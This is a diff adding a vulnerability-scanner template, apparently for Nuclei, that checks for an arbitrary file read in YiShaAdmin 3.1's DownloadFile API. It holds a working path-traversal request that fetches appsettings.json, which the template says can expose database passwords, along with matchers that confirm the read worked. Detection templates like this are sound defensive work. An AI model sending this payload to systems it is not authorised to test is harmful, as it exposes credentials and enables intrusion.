@@ -1,0 +1,26 @@
+id: yishaadmin-file-read
+
+info:
+  name: YiShaAdmin 3.1 DownloadFile Api Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    YiShaAdmin is based on the .NET Core MVC permission management system. Attackers can exploit the vulnerability to read arbitrary files, including database passwords.
+  reference:
+    - https://github.com/liukuo362573/YiShaAdmin
+  tags: file-read
+
+http:
+  - raw:
+      - |
+        GET /admin/File/DownloadFile?filePath=wwwroot/../appsettings.json&delete=0 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Logging"
+        part: body
